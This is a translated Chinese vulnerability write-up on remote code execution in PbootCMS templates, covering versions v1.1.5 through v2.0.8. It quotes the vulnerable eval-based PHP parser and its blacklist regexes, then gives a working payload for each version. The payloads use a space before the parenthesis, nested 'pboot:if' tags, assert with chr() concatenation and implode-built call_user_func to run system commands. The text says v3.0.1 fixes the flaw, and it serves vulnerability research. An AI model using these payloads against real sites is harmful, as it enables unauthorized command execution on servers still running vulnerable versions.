# PbootCMS任意代码执行的前世今生
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## PbootCMS (v1.1.5及其以下)
###  漏洞复现
    poc:
    {pboot:if(system(whoami))}{/pboot:if}
###  漏洞分析
漏洞点位于`/apps/home/controller/ParserController.php`
        public function parserIfLabel($content)
        {
            $pattern = '/\{pboot:if\(([^}]+)\)\}([\s\S]*?)\{\/pboot:if\}/';
            $pattern2 = '/pboot:([0-9])+if/';
            if (preg_match_all($pattern, $content, $matches)) {
                $count = count($matches[0]);
                for ($i = 0; $i restorePreLabel($matches[1][$i]);
                    // 解码条件字符串
                    $matches[1][$i] = decode_string($matches[1][$i]);
                    // 带有函数的条件语句进行安全校验
                    if (preg_match_all('/([\w]+)([\\\s]+)?\(/i', $matches[1][$i], $matches2)) {
                        foreach ($matches2[1] as $value) {
                            if ((function_exists($value) || preg_match('/^eval$/i', $value)) && ! in_array($value, $white_fun)) {
                                $danger = true;
                                break;
                            }
                        }
                    }
                    // 不允许从外部获取数据
                    if (preg_match('/(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)/i', $matches[1][$i])) {
                        $danger = true;
                    }
                    // 如果有危险函数，则不解析该IF
                    if ($danger) {
                        continue;
                    }
                    eval('if(' . $matches[1][$i] . '){$flag="if";}else{$flag="else";}');
禁止了外部数据的获取，白名单处的正则匹配不严谨，导致函数名+空格+()可以实现绕过
    payload
    {pboot:if(system (whoami))}{/pboot:if}
## PbootCMS(v2.0.3)
增加了外部获取数据过滤部分，代码如下
    if (preg_match('/(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(fwrite)|(phpinfo)|(base64_decode)/i', $matches[1][$i])) {
                        $danger = true;
                    }
并不影响我们使用`system`函数，提交上一个版本`payload`，发现`pboot:if`被删掉了  
在`apps/home/controller/IndexController.php`里第270行  
使用了将`pboot:if`替换为空
所以直接双写绕过
    payload
    {pbopboot:ifot:if(system (whoami))}{/pbpboot:ifoot:if}
## PbootCMS(v2.0.4-v2.0.7)
使用上一个版本`payload`，发下双写也被过滤了
改动的地方位于`/core/basic/Model.php`，增加了如下代码  
也就是再过滤了一次`pboot:if`，然而这种替换为空是根本没用的，于是三重写绕过，但是`v2.0.4`还增加了正则黑名单的过滤，禁用了`system`等函数，代码如下  
正则匹配黑名单加强，代码如下
    if (preg_match('/(\$_GET\[)|(\$_POST\[)|(\$_REQUEST\[)|(\$_COOKIE\[)|(\$_SESSION\[)|(file_put_contents)|(fwrite)|(phpinfo)|(base64_decode)|(`)|(shell_exec)|(eval)|(system)|(exec)|(passthru)/i', $matches[1][$i])) {
                        $danger = true;
                    }
发现漏掉了`assert`函数，没用过滤`chr`函数，所以直接拼接绕过
    payload
    {ppbopboot:ifot:ifboot:if(assert (chr (115).chr (121).chr (115).chr (116).chr (101).chr (109).chr (40).chr (119).chr (104).chr (111). chr (97).chr (109).chr (105).chr (41)))}{/pbpbopboot:ifot:ifoot:if}
## PbootCMS(v2.0.8)
从`v2.0.8`开始采用递归替换`pboot:if`，位于`/app/home/controller/MessageController.php`第61行
    $field_data = preg_replace_r('/pboot:if/i', '', $field_data);
跟进一下，位于`/core/function/handle.php`
    function preg_replace_r($search, $replace, $subject)
    {
        while (preg_match($search, $subject)) {
            $subject = preg_replace($search, $replace, $subject);
        }
        return $subject;
    }
这样就无法采用双写绕过了，正则表达式处改动了，导致函数+空格被过滤，代码如下
    if (preg_match_all('/([\w]+)([\s\\\\]+)?\(/i', $matches[1][$i], $matches2)) {
                        foreach ($matches2[1] as $value) {
                            if (function_exists($value) && ! in_array($value, $white_fun)) {
                                $danger = true;
                                break;
                            }
                        }
                    }
后台不会经过`preg_replace`函数的处理，使用的白名单里`implode`函数任然可以实现任意代码执行
    payload
    {pboot:if(implode('', ['c','a','l','l','_','u','s','e','r','_','f','u','n','c'])(implode('',['s','y','s','t','e','m']),implode('',['w','h','o','a','m','i'])))}{/pboot:if}
## 后记
`PbootCMS`的最新版本`v3.0.1`已经发布修复了该漏洞，从`v1.0.1`最开始的第一个版本到`v2.0.9`历时2年经过不断的漏洞修复，但是每次修复后就被绕过，不由得引发一系列反思